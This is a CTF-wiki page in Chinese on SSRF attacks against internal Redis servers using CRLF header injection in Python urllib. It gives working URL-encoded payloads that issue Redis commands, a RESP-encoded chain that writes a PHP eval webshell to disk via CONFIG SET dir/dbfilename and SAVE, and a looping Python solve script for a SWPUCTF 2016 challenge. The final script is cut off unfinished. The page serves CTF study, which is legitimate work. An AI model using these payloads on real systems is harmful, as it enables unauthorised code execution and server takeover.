# Redis 
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/).



http://redisdoc.com/string/set.html 

上面的链接时redis的指令参考集，实际使用的同时并不会全部用上，只会使用到部分。

## python urllib SSRF

### 如何攻击Redis

两种方案，具体看参考链接。原理都是一样的，写文件到目标目录。

```
CONFIG SET dir /tmp
CONFIG SET dbfilename evil  //这一步可以将db设置为/tmp/evil,可以控制文件里面的部分数据了。
SET foo bar
SAVE
```

上述Redis命令可以使`key-value`数据保存在`/tmp/evil`文件中，也就是我们可以控制里面的部分内容： [![img](https://i.imgur.com/rq0THqE.png)](https://i.imgur.com/rq0THqE.png)

### 0x02 Python urllib HTTP头注入(crlf+ssrf)

简单使用一下代码测试访问url：

```
import urllib
import sys

urllib.urlopen(sys.argv[1])
```

这里是个SSRF漏洞，当输入一下payload，还能注入我们想要的http头数据： 输入：

```
python urlopen.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
```

监听本机12345端口，得到发包数据：

```
GET /foo HTTP/1.0
Host: 127.0.0.1
X-injected: header  //头数据注入
x-leftover: :12345
User-Agent: Python-urllib/1.17
```

不仅如此，还可以改变请求构造为POST数据。具体参考链接1。和Gopher协议有同样的妙用。

### 0x03 结合攻击Redis

发送payload到内网Redis端口：

```
http://192.168.0.7%0d%0aSET%20A%20EVIL%0d%0a:6379/foo
```

可以在Redis中添加`A:EVIL`的键值对,即：执行了`SET A EVIL`命令。数据包为：

```

GET /foo HTTP/1.0
Host: 192.168.0.7
SET A EVIL
:12345
User-Agent: Python-urllib/1.17
```

[![img](Redis.assets/1NiCcyb.png)](https://i.imgur.com/1NiCcyb.png)

### 0x04 实际shell攻击

#### 1. 写入空格限制

Redis协议突破空格限制：

```
*3
$3
SET
$1
A
$9
test you
```

url编码得到payload：

```
http://192.168.0.7%0D%0A%2a3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0AA%0D%0A%248%0D%0Atest%20you%0D%0A:6379/foo
```

测试结果如下，成功执行命令：

```
127.0.0.1:6379> get A
"EVIL"
127.0.0.1:6379> get A
"test you"
```

#### 2. 综合利用写文件

测试payload直接写文件： redis原命令：

```
SET foo \n<?php @eval($_POST[c][/c]);?>\n
CONFIG SET dir /tmp
CONFIG SET dbfilename webshell
SAVE
```

即：

```

*3
$3
SET
$5
shell
$27
\n<?php @eval($_POST[c][/c]);?>\n
CONFIG SET dir /tmp
CONFIG SET dbfilename webshell123
SAVE
```

按照上述编码规则可得payload：

```
python urlopen.py http://192.168.0.7%0D%0A%2a3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2427%0D%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bc%5D%29%3B%3F%3E%0A%0D%0ACONFIG%20SET%20dir%20%2ftmp%0D%0ACONFIG%20SET%20dbfilename%20webshell123%0D%0ASAVE%0D%0A:6379/foo
```

成功写入shell到/tmp/webshell123文件中，文件内容如下： [![img](Redis.assets/csPfIyx.png)](https://i.imgur.com/csPfIyx.png) 定时任务反弹shell和添加ssh-key方法，详见链接2。

### 样例：[SWPUCTF 2016]Web7

```
http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo
数据库保存位置修改
```



```
import requests

url = "http://6fe99eb6-b7ba-4e34-b5b4-6ce622aca224.node4.buuoj.cn/input"
data = {"url":"http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo",
        "submit":"submit"}
data1 = {

}
while (1) :
    r = requests.post(url=url, data=data)
    print (r.text)
密码修改
```